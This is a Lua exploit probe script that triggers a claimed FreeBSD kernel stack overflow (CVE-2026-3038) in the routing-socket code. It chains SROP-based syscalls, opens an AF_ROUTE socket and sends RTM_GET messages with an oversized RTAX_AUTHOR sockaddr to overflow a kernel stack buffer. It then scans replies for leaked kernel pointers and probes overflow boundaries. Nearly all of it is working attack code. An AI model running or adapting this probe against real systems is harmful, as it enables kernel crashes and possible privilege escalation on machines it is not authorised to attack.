-- CRASH_CLASS: HIGH
-- PROBE 165a: CVE-2026-3038 rtsock_msg_buffer stack overflow
--
-- FreeBSD-SA-26:05.route: rtsock_msg_buffer() in sys/net/rtsock.c
-- copies sockaddr via bcopy(sa, &ss, sa->sa_len) where ss is 128 bytes.
-- RTAX_AUTHOR is not validated by cleanup_xaddrs(), so sa_len=255
-- overflows by 127 bytes, hitting stack canary and return address.
--
-- Our retest 53b confirmed AF_ROUTE RTM_GET works on 14.10.
-- This probe sends RTM_GET with an oversized RTAX_AUTHOR sockaddr.
-- Expected outcomes:
--   - Kernel panic = bug exists (stack canary tripped)
--   - Process killed = kernel detected the overflow
--   - Returns -1 = path is different or patched
--   - Returns 0 = bug exists AND exploitable (no canary!)

print("=== PROBE 165a: RTSOCK CVE-2026-3038 ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end
local function wb(addr, val)
    local cur = to_num(memory.read_dword(addr))
    local byte_off = 0
    local mask = 0xFF
    memory.write_dword(addr, (cur % 256 == val % 256) and cur or
        bit.bor(bit.band(cur, bit.bnot(0xFF)), val % 256))
end
local function rd(addr) return to_num(memory.read_dword(addr)) end
local function rq(addr) return memory.read_qword(addr) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x400000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end

-- Helper: write byte at offset within gpu region
local function set_byte(off, val)
    local aligned = off - (off % 4)
    local shift = (off % 4) * 8
    local cur = rd(gpu + aligned)
    local mask = bit.bnot(bit.lshift(0xFF, shift))
    local new = bit.bor(bit.band(cur, mask), bit.lshift(val % 256, shift))
    wd(gpu + aligned, new)
end

-- [A] Create AF_ROUTE socket
print("--- [A] AF_ROUTE SOCKET ---")
-- socket(AF_ROUTE=17, SOCK_RAW=3, 0)
local rtfd = srop(97, uint64(17), uint64(3), uint64(0))
local rtfdv = rtfd and to_num(rtfd) or -1
print("rt_socket=" .. rtfdv)

if rtfdv < 0 then
    print("AF_ROUTE socket failed")
    print("=== DONE ===")
    return
end

-- [B] First: send a normal RTM_GET to confirm the path works
print("")
print("--- [B] NORMAL RTM_GET ---")

-- rt_msghdr layout (FreeBSD):
-- +0x00: rtm_msglen (u_short)
-- +0x02: rtm_version (u_char) = RTM_VERSION=5
-- +0x03: rtm_type (u_char) = RTM_GET=4
-- +0x04: rtm_index (u_short)
-- +0x06: padding
-- +0x08: rtm_flags (int)
-- +0x0C: rtm_addrs (int) — bitmask of which sockaddrs follow
-- +0x10: rtm_pid (pid_t)
-- +0x14: rtm_seq (int)
-- +0x18: rtm_errno (int)
-- +0x1C: rtm_fmask (int)
-- +0x20: rtm_inits (u_long, 8 bytes on amd64)
-- +0x28: rtm_rmx (struct rt_metrics, 0x68 bytes on amd64)
-- Total header = 0x90 (144 bytes) on amd64 FreeBSD

-- RTAX_DST=0, RTAX_GATEWAY=1, RTAX_NETMASK=2, RTAX_AUTHOR=6
-- RTA_DST=1, RTA_GATEWAY=2, RTA_NETMASK=4, RTA_AUTHOR=0x40

local MSG = 0x50000
-- Clear message area
for off = 0, 0x1FF, 4 do wd(gpu + MSG + off, 0) end

-- Build rt_msghdr
local hdr_len = 0x90  -- 144 bytes on amd64

-- sockaddr_in for DST: 127.0.0.1
local DST = MSG + hdr_len
set_byte(DST, 16)   -- sa_len = 16
set_byte(DST + 1, 2)  -- sa_family = AF_INET
set_byte(DST + 4, 127) -- sin_addr = 127.0.0.1
set_byte(DST + 5, 0)
set_byte(DST + 6, 0)
set_byte(DST + 7, 1)

local total_len = hdr_len + 16  -- header + DST sockaddr

-- Set header fields
-- rtm_msglen
set_byte(MSG, total_len % 256)
set_byte(MSG + 1, math.floor(total_len / 256))
-- rtm_version = 5
set_byte(MSG + 2, 5)
-- rtm_type = RTM_GET = 4
set_byte(MSG + 3, 4)
-- rtm_addrs = RTA_DST = 0x01
wd(gpu + MSG + 0x0C, 1)
-- rtm_seq = 1
wd(gpu + MSG + 0x14, 1)

-- Send normal RTM_GET
print("sending normal RTM_GET len=" .. total_len)
local wr = srop(4, uint64(rtfdv), ga(MSG), uint64(total_len))
local wrv = wr and to_num(wr) or -999
print("write(normal)=" .. wrv)

-- Read response
local RBUF = 0x60000
for off = 0, 0xFFF, 4 do wd(gpu + RBUF + off, 0) end
local rr = srop(3, uint64(rtfdv), ga(RBUF), uint64(0x1000))
local rrv = rr and to_num(rr) or -999
print("read(response)=" .. rrv)

if rrv > 0 then
    local resp_type = rd(gpu + RBUF + 3) % 256
    local resp_addrs = rd(gpu + RBUF + 0x0C)
    print("resp_type=" .. resp_type .. " resp_addrs=0x" ..
        string.format("%X", resp_addrs))
end

print("pid_after_normal=" .. to_num(make_syscall(20)()))

-- [C] Now test with RTAX_AUTHOR with sa_len=255 (CVE trigger)
print("")
print("--- [C] CVE-2026-3038 TRIGGER ---")
print("*** RTM_GET with RTAX_AUTHOR sa_len=255 ***")

-- Need to rebuild message with RTA_DST + RTA_AUTHOR
-- Sockaddrs must be in RTAX order (DST, GW, NETMASK, GENMASK, IFP, IFA, AUTHOR)
-- We include DST and AUTHOR (skipping intermediate ones)

local MSG2 = 0x70000
for off = 0, 0x3FF, 4 do wd(gpu + MSG2 + off, 0) end

-- DST sockaddr (16 bytes, 127.0.0.1)
local DST2 = MSG2 + hdr_len
set_byte(DST2, 16)
set_byte(DST2 + 1, 2)  -- AF_INET
set_byte(DST2 + 4, 127)
set_byte(DST2 + 5, 0)
set_byte(DST2 + 6, 0)
set_byte(DST2 + 7, 1)

-- AUTHOR sockaddr (sa_len=255, the overflow payload)
-- Must be padded to fill the gap between DST and AUTHOR in RTAX order
-- But FreeBSD processes them by RTA bitmask — only present ones occupy space
local AUTHOR = DST2 + 16  -- immediately after DST
set_byte(AUTHOR, 255)  -- sa_len = 255 (OVERFLOW!)
set_byte(AUTHOR + 1, 2)  -- sa_family = AF_INET
-- Fill with pattern to identify in crash dump
for i = 2, 254 do
    set_byte(AUTHOR + i, 0x41 + (i % 26))  -- ABCDEF... pattern
end

local total_len2 = hdr_len + 16 + 255  -- header + DST + AUTHOR

-- Set header
set_byte(MSG2, total_len2 % 256)
set_byte(MSG2 + 1, math.floor(total_len2 / 256))
set_byte(MSG2 + 2, 5)  -- version
set_byte(MSG2 + 3, 4)  -- RTM_GET
-- rtm_addrs = RTA_DST(1) | RTA_AUTHOR(0x40) = 0x41
wd(gpu + MSG2 + 0x0C, 0x41)
wd(gpu + MSG2 + 0x14, 2)  -- seq=2

print("sending RTM_GET with AUTHOR sa_len=255, total=" .. total_len2)

-- This might kernel panic!
local wr2 = srop(4, uint64(rtfdv), ga(MSG2), uint64(total_len2))
local wr2v = wr2 and to_num(wr2) or -999
print("write(overflow)=" .. wr2v)

if wr2v == -999 then
    print("*** SROP FAILED — process may be dead ***")
elseif wr2v == -1 then
    print("write returned -1 (rejected)")
else
    print("write returned " .. wr2v .. " — reading response...")

    for off = 0, 0xFFF, 4 do wd(gpu + RBUF + off, 0) end
    local rr2 = srop(3, uint64(rtfdv), ga(RBUF), uint64(0x1000))
    local rr2v = rr2 and to_num(rr2) or -999
    print("read(overflow_response)=" .. rr2v)

    if rr2v > 0 then
        print("*** SURVIVED CVE-2026-3038 TRIGGER! ***")

        -- Scan response for kernel pointers
        local kptrs = 0
        for off = 0, math.min(rr2v, 0xFFF) - 8, 8 do
            local val = rq(gpu + RBUF + off)
            local vh, vl = get_hi_lo(val)
            if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
                kptrs = kptrs + 1
                print("  KPTR at +" .. string.format("%03X", off) ..
                    "=0x" .. string.format("%X%08X", vh, vl))
            end
        end
        print("kernel_pointers_found=" .. kptrs)
    end
end

print("")
print("pid_cve=" .. tostring(to_num(make_syscall(20)())))

-- [D] Test with different sa_len values to probe the boundary
print("")
print("--- [D] SA_LEN BOUNDARY TEST ---")
for _, test_len in ipairs({128, 129, 130, 160, 200, 254}) do
    local MSG3 = 0x80000
    for off = 0, 0x3FF, 4 do wd(gpu + MSG3 + off, 0) end

    local DST3 = MSG3 + hdr_len
    set_byte(DST3, 16)
    set_byte(DST3 + 1, 2)
    set_byte(DST3 + 4, 127)
    set_byte(DST3 + 7, 1)

    local AUTH3 = DST3 + 16
    set_byte(AUTH3, test_len)
    set_byte(AUTH3 + 1, 2)
    for i = 2, test_len - 1 do set_byte(AUTH3 + i, 0x42) end

    local tl3 = hdr_len + 16 + test_len
    set_byte(MSG3, tl3 % 256)
    set_byte(MSG3 + 1, math.floor(tl3 / 256))
    set_byte(MSG3 + 2, 5)
    set_byte(MSG3 + 3, 4)
    wd(gpu + MSG3 + 0x0C, 0x41)
    wd(gpu + MSG3 + 0x14, 100 + test_len)

    local wr3 = srop(4, uint64(rtfdv), ga(MSG3), uint64(tl3))
    local wr3v = wr3 and to_num(wr3) or -999
    print("sa_len=" .. test_len .. " write=" .. wr3v)

    local alive_ok, alive_pid = pcall(function() return make_syscall(20)() end)
    if not alive_ok or to_num(alive_pid) ~= pid then
        print("*** DIED at sa_len=" .. test_len .. " ***")
        break
    end
end

srop(6, uint64(rtfdv))
print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
